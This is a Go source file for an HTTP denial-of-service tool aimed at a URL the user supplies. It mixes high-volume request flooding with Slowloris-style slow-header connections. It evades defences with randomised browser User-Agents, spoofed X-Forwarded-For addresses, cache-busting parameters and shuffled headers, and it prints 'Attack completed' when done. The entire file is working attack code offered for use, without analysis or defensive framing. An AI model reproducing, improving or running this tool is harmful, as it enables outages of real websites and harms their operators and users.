package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"sync"
	"time"
)

var (
	ip            string
	ips           []string
	port          int
	path          string
	threads       int
	timer         int
	customHost    string
	httpMethods   = []string{"GET", "HEAD", "POST"}
	slowlorisRate = 0.4
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func resolveDNS(hostname string) {
	addrs, err := net.LookupIP(hostname)
	if err != nil {
		fmt.Println("DNS resolution failed:", err)
		os.Exit(1)
	}
	for _, addr := range addrs {
		if ipv4 := addr.To4(); ipv4 != nil {
			ips = append(ips, ipv4.String())
		}
	}
	if len(ips) == 0 {
		fmt.Println("No IPs resolved")
		os.Exit(1)
	}
}

func randomUserAgent() string {
	browserVersions := map[string]string{
		"Chrome":  fmt.Sprintf("%d.0.%d.%d", rand.Intn(43)+80, rand.Intn(9999), rand.Intn(999)),
		"Firefox": fmt.Sprintf("%d.0", rand.Intn(50)+70),
		"Safari":  fmt.Sprintf("%d.%d.%d", rand.Intn(200)+400, rand.Intn(10), rand.Intn(10)),
		"Edg":     fmt.Sprintf("%d.%d.%d", rand.Intn(50)+90, rand.Intn(9999), rand.Intn(999)),
	}

	osInfo := map[string]string{
		"Windows":   fmt.Sprintf("Windows NT %d.%d; Win64; x64", 10+rand.Intn(2), rand.Intn(3)),
		"Mac":       fmt.Sprintf("Macintosh; Intel Mac OS X 10_%d_%d", 12+rand.Intn(5), rand.Intn(5)),
		"Linux":     "X11; Linux x86_64",
		"Android":   fmt.Sprintf("Android %d", 10+rand.Intn(5)),
		"iPhone":    fmt.Sprintf("iPhone; CPU iPhone OS %d_%d like Mac OS X", 13+rand.Intn(4), rand.Intn(3)),
		"iPad":      fmt.Sprintf("iPad; CPU OS %d_%d like Mac OS X", 13+rand.Intn(4), rand.Intn(3)),
	}

	devices := []struct {
		typeName string
		models   []string
	}{
		{"Mobile", []string{"Pixel 6", "Galaxy S22", "Xiaomi 12", "iPhone15,2"}},
		{"Tablet", []string{"iPad13,4", "SM-T870", "Pixel Tablet"}},
		{"Desktop", []string{"", "", "", ""}}, // Empty for desktop
	}

	// Select random device type
	deviceType := devices[rand.Intn(len(devices))]
	model := ""
	if deviceType.typeName != "Desktop" && len(deviceType.models) > 0 {
		model = deviceType.models[rand.Intn(len(deviceType.models))] + "; "
	}

	// Select random OS
	var osKeys []string
	for k := range osInfo {
		osKeys = append(osKeys, k)
	}
	selectedOS := osKeys[rand.Intn(len(osKeys))]

	// Select random browser
	var browserKeys []string
	for k := range browserVersions {
		browserKeys = append(browserKeys, k)
	}
	selectedBrowser := browserKeys[rand.Intn(len(browserKeys))]

	return fmt.Sprintf("Mozilla/5.0 (%s%s%s) AppleWebKit/537.36 (KHTML, like Gecko) %s/%s",
		model,
		osInfo[selectedOS],
		func() string {
			if rand.Intn(2) == 0 && deviceType.typeName == "Mobile" {
				return " Mobile"
			}
			return ""
		}(),
		selectedBrowser,
		browserVersions[selectedBrowser],
	)
}

func buildRequest(method, path string) []byte {
	host := customHost
	if host == "" {
		host = ip
	}

	headers := []string{
		fmt.Sprintf("Host: %s", host),
		fmt.Sprintf("User-Agent: %s", randomUserAgent()),
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Language: en-US,en;q=0.5",
		"Accept-Encoding: gzip, deflate, br",
		fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)),
		"Connection: keep-alive",
		"Cache-Control: max-age=0",
		"Upgrade-Insecure-Requests: 1",
	}

	if method == "POST" {
		data := fmt.Sprintf("data=%d", rand.Intn(1000000))
		headers = append(headers,
			"Content-Type: application/x-www-form-urlencoded",
			fmt.Sprintf("Content-Length: %d", len(data)),
		)
	}

	rand.Shuffle(len(headers), func(i, j int) {
		headers[i], headers[j] = headers[j], headers[i]
	})

	path += fmt.Sprintf("?cache_bust=%d", rand.Intn(1000000))
	if rand.Intn(2) == 0 {
		path += fmt.Sprintf("&rand=%d", rand.Intn(1000000))
	}

	return []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n%s\r\n\r\n",
		method, path, joinHeaders(headers)))
}

func joinHeaders(headers []string) string {
	var result string
	for _, h := range headers {
		result += h + "\r\n"
	}
	return result
}

func floodWorker(id int, stop <-chan struct{}) {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         ip,
	}

	for {
		select {
		case <-stop:
			return
		default:
			target := fmt.Sprintf("%s:%d", ips[rand.Intn(len(ips))], port)
			conn, err := createConnection(target, tlsConfig)
			if err != nil {
				continue
			}

			for i := 0; i < rand.Intn(100)+100; i++ {
				method := httpMethods[rand.Intn(len(httpMethods))]
				conn.Write(buildRequest(method, path))
			}
			conn.Close()
		}
	}
}

func slowlorisWorker(id int, stop <-chan struct{}) {
	tlsConfig := &tls.Config{InsecureSkipVerify: true}

	for {
		select {
		case <-stop:
			return
		default:
			target := fmt.Sprintf("%s:%d", ips[rand.Intn(len(ips))], port)
			conn, err := createConnection(target, tlsConfig)
			if err != nil {
				continue
			}

			partial := fmt.Sprintf("GET %s?slow=%d HTTP/1.1\r\nHost: %s\r\n", 
				path, rand.Intn(10000), ip)
			conn.Write([]byte(partial))

			for i := 0; i < 10; i++ {
				select {
				case <-stop:
					conn.Close()
					return
				case <-time.After(time.Second * time.Duration(rand.Intn(5)+1)):
					conn.Write([]byte(fmt.Sprintf("X-a: %d\r\n", rand.Intn(100))))
				}
			}
			conn.Close()
		}
	}
}

func createConnection(target string, tlsConfig *tls.Config) (net.Conn, error) {
	if port == 443 {
		return tls.Dial("tcp", target, tlsConfig)
	}
	return net.Dial("tcp", target)
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: <URL> <THREADS> <TIMER> [CUSTOM_HOST]")
		return
	}

	u, err := url.Parse(os.Args[1])
	if err != nil {
		fmt.Println("URL error:", err)
		return
	}

	ip = u.Hostname()
	port, _ = strconv.Atoi(u.Port())
	if port == 0 {
		if u.Scheme == "https" {
			port = 443
		} else {
			port = 80
		}
	}
	path = u.Path
	if path == "" {
		path = "/"
	}

	threads, _ = strconv.Atoi(os.Args[2])
	timer, _ = strconv.Atoi(os.Args[3])
	if len(os.Args) > 4 {
		customHost = os.Args[4]
	}

	resolveDNS(ip)
	fmt.Printf("Target: %s:%d (%d IPs)\n", ip, port, len(ips))

	stop := make(chan struct{})
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			if rand.Float64() < slowlorisRate {
				slowlorisWorker(id, stop)
			} else {
				floodWorker(id, stop)
			}
		}(i)
	}

	time.Sleep(time.Duration(timer) * time.Second)
	close(stop)
	wg.Wait()
	fmt.Println("Attack completed")
}
